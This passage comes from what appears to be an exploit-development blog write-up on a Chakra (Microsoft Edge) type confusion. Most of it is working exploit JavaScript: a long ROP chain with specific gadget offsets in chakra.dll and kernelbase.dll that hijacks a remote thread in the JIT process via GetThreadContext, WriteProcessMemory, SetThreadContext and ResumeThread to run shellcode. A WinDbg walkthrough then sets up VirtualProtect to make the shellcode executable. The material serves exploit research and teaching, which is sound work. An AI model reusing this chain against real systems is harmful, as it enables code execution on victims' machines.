	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!WriteProcessMemory)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x28)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
	next();

	// VirtualAlloc() ROP chain
	// Stage 7 -> Allocate some local memory to store the CONTEXT structure from GetThreadContext

	// DWORD flProtect (R9)
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000004, 0x00000000);             // PAGE_READWRITE (0x4)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
	next();

	// LPVOID lpAddress (RCX)
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // NULL (let VirtualAlloc() decide the address)
	next();

	// SIZE_T dwSize (RDX) (0x4d0 = sizeof(CONTEXT))
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x000004d0, 0x00000000);             // (0x4d0 bytes)
	next();

	// DWORD flAllocationType (R8) ( MEM_RESERVE | MEM_COMMIT = 0x3000)
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);      // 0x180576231: pop r8 ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00003000, 0x00000000);             // MEM_RESERVE | MEM_COMMIT (0x3000)
	next();

	// Call KERNELBASE!VirtualAlloc
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x5ac10, kernelbaseHigh); // KERNELBASE!VirtualAlloc address 
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!VirtualAlloc)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!VirtualAlloc - 0x180243949: add rsp, 0x38 ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38     
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
	next();

	// GetThreadContext() ROP chain
    // Stage 8 -> Dump the registers of our newly created thread within the JIT process to leak the stack

    // First, let's store some needed offsets of our VirtualAlloc allocation, as well as the address itself, in the .data section of kernelbase.dll
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a108, kernelbaseHigh); // .data section of kernelbase.dll where we will store the VirtualAlloc allocation
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
    next();

    // Save VirtualAlloc_allocation+0x30. This is the offset in our buffer (CONTEXT structure) that is ContextFlags
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x22b732, chakraHigh);       // 0x18022b732: add rax, 0x10 ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x22b732, chakraHigh);       // 0x18022b732: add rax, 0x10 ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x22b732, chakraHigh);       // 0x18022b732: add rax, 0x10 ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);        // 0x180046377: pop rcx ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a110, kernelbaseHigh); // .data section of kernelbase.dll where we will store CONTEXT.ContextFlags
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
    next();

    // We need to set CONTEXT.ContextFlags. This address (0x30 offset from CONTEXT buffer allocated from VirtualAlloc) is in kernelbase+0x21a110
    // The value we need to set is 0x10001F
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);        // 0x180046377: pop rcx ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a110, kernelbaseHigh); // .data section of kernelbase.dll with CONTEXT.ContextFlags address
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x0010001F, 0x00000000);             // CONTEXT_ALL
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);      // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
    next();

    // HANDLE hThread
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a100, kernelbaseHigh); // .data section of kernelbase.dll where our thread HANDLE is
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (RAX already has valid pointer)
    next();

    // LPCONTEXT lpContext
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a108-0x8, kernelbaseHigh); // .data section of kernelbase.dll where our VirtualAlloc allocation is (our CONTEXT structure)
    next();                                                                      
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x255fa0, chakraHigh);       // mov rdx, qword [rdx+0x08] ; mov rax, rdx ; ret
    next();

    // Call KERNELBASE!GetThreadContext
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x72d10, kernelbaseHigh); // KERNELBASE!GetThreadContext address 
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!GetThreadContext)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);       // "return address" for KERNELBASE!GetThreadContext - 0x180243949: add rsp, 0x38 ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38     
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
    next();

    // Locate store CONTEXT.Rsp and store it in .data of kernelbase.dll
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);        // 0x180046377: pop rcx ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a110, kernelbaseHigh); // .data section of kernelbase.dll where we stored CONTEXT.ContextFlags
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x4c37c5, chakraHigh);		// 0x1804c37c5: mov rax, qword [rcx] ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x26f73a, chakraHigh);       // 0x18026f73a: add rax, 0x68 ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);        // 0x180046377: pop rcx ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a118, kernelbaseHigh); // .data section of kernelbase.dll where we want to store CONTEXT.Rsp
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);      // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
    next();

    // Update CONTEXT.Rip to point to a ret gadget directly instead of relying on CreateRemoteThread start routine (which CFG checks)
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x26f72a, chakraHigh);      // 0x18026f72a: add rax, 0x60 ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x28b4fe, chakraHigh);	   // ret gadget we want to overwrite our remote thread's RIP with 
	next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xfeab, chakraHigh);        // 0x18000feab: mov qword [rax], rcx ; ret  (Context.Rip = ret_gadget)
    next();

    // WriteProcessMemory() ROP chain (Number 4)
    // Stage 9 -> Write our ROP chain to the remote process, using the JIT handle and the leaked stack via GetThreadContext()

    // SIZE_T nSize (R9)
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000100, 0x00000000);             // SIZE_T nSize (0x100) (CONTEXT.Rsp is writable and a "full" stack, so 0x100 is more than enough)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();

    // LPVOID lpBaseAddress (RDX)
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a118-0x08, kernelbaseHigh);      // .data section of kernelbase.dll where CONTEXT.Rsp resides
    next();                                                                      
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x255fa0, chakraHigh);       // mov rdx, qword [rdx+0x08] ; mov rax, rdx ; ret (Pointer to CONTEXT.Rsp)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x26ef31, chakraHigh);      // 0x18026ef31: mov rax, qword [rax] ; ret (get CONTEXT.Rsp)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x435f21, chakraHigh);      // 0x180435f21: mov rdx, rax ; mov rax, rdx ; add rsp, 0x28 ; ret (RAX and RDX now both have CONTEXT.Rsp)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();

    // LPCVOID lpBuffer (R8)
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);      // 0x180576231: pop r8 ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000+ropBegin, chakraHigh);      // .data section of chakra.dll where our ROP chain is
    next();

    // HANDLE hProcess (RCX)
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which holds the full perms handle to JIT server
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
    next();                                                                     // Recall RAX already has a writable pointer in it  

    // Call KERNELBASE!WriteProcessMemory
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!WriteProcessMemory)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x20)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
    next();
	// SetThreadContext() ROP chain
    // Stage 10 -> Update our remote thread's RIP to return execution into our VirtualProtect ROP chain

    // HANDLE hThread (RCX)
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);        // 0x180046377: pop rcx ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a100, kernelbaseHigh); // .data section of kernelbase.dll where our thread HANDLE is
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (RAX already has valid pointer)
    next();

    // const CONTEXT *lpContext
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a108-0x8, kernelbaseHigh); // .data section of kernelbase.dll where our VirtualAlloc allocation is (our CONTEXT structure)
    next();                                                                      
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x255fa0, chakraHigh);       // mov rdx, qword [rdx+0x08] ; mov rax, rdx ; ret
    next();

    // Call KERNELBASE!SetThreadContext
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x7aa0, kernelbaseHigh); // KERNELBASE!SetThreadContext address 
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!SetThreadContext)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);       // "return address" for KERNELBASE!SetThreadContext - 0x180243949: add rsp, 0x38 ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38     
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
    next();

    // ResumeThread() ROP chain
    // Stage 11 -> Resume the thread, with RIP now pointing to a return into our ROP chain

    // HANDLE hThread (RCX)
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);        // 0x180046377: pop rcx ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a100, kernelbaseHigh); // .data section of kernelbase.dll where our thread HANDLE is
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (RAX already has valid pointer)
    next();

    // Call KERNELBASE!ResumeThread
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x70a50, kernelbaseHigh); // KERNELBASE!ResumeThread address 
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!ResumeThread)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);       // "return address" for KERNELBASE!ResumeThread - 0x180243949: add rsp, 0x38 ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38     
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);
    next();
}
</script>
```

Let's start by setting a breakpoint on a `jmp rax` gadget to reach our `SetThreadContext` call.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion188.png" alt="">

The first parameter we will deal with is the handle to the remote thread we have within the JIT process.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion189.png" alt="">

This brings our calls to the following states:

```c
SetThreadContext(
	threadHandle,				// A handle to the thread we want to set (our thread we created via CreateRemoteThread)
	-
);
```

```c
ResumeThread(
	-
);
```

The next parameter we will set is the pointer to our updated `CONTEXT` structure.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion190.png" alt="">

We then can get `SetThreadContext` into RAX and call it. The call should be in the following state:

```c
SetThreadContext(
	threadHandle,				// A handle to the thread we want to set (our thread we created via CreateRemoteThread)
	addressof(VirtualAlloc_buffer)		// The updated CONTEXT structure
);
```

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion191.png" alt="">

We then can execute our `SetThreadContext` call and hit our first `ResumeThread` gadget.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion192.png" alt="">

`ResumeThread` only has one parameter, so we will fill it and set up RAX BUT WE WILL NOT YET EXECUTE THE CALL!

```c
ResumeThread(
	threadHandle,				// A handle to the thread we want to set (our thread we created via CreateRemoteThread)
);
```

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion193.png" alt="">

Before we execute `ResumeThread`, we now need to attach _another_ WinDbg instance to the JIT process. We will set a breakpoint on our `ret` gadget and see if we successfully control the remote thread!

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion194.png" alt="">

Coming back to the content process, we can hit `pt` to execute our call to `ResumeThread`, which should kick off execution of our remote thread within the JIT process!

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion195.png" alt="">

Going back to the JIT process, we can see our breakpoint was hit and our ROP chain is on the stack! We have gained code execution in the JIT process!

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion196.png" alt="">

Our last step will be to walk through our `VirtualProtect` ROP chain, which should mark our shellcode as RWX. Here is how the call should look:

```c
VirtualProtect(
	addressof(shellcode),				// The address of our already injected shellcode (we want this to be marked as RWX)
	sizeof(shellcode),				// The size of the memory we want to mark as RWX
	PAGE_EXECUTE_READWRITE,				// We want our shellcode to be RWX
	addressof(data_address) 			// Any writable address
);
```

Executing the `ret` gadget, we hit our first ROP gadgets which setup the `lpflOldProtect` parameter, which is any address that is writable

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion197.png" alt="">

We are now here:

```c
VirtualProtect(
	-
	-
	-
	addressof(data_address) 			// Any writable address
);
```

The next parameter we will address is the `lpAddress` parameter - which is the address of our shellcode (the page we want to mark as RWX)

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion198.png" alt="">

We are now here:

```c
VirtualProtect(
	addressof(shellcode),				// The address of our already injected shellcode (we want this to be marked as RWX)
	-
	-
	addressof(data_address) 			// Any writable address
);
```

Next up is `dwSize`, which we set to `0x1000`.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion199.png" alt="">

We are now here:

```c
VirtualProtect(
	addressof(shellcode),				// The address of our already injected shellcode (we want this to be marked as RWX)
	sizeof(shellcode),				// The size of the memory we want to mark as RWX
	-
	addressof(data_address) 			// Any writable address
);
```

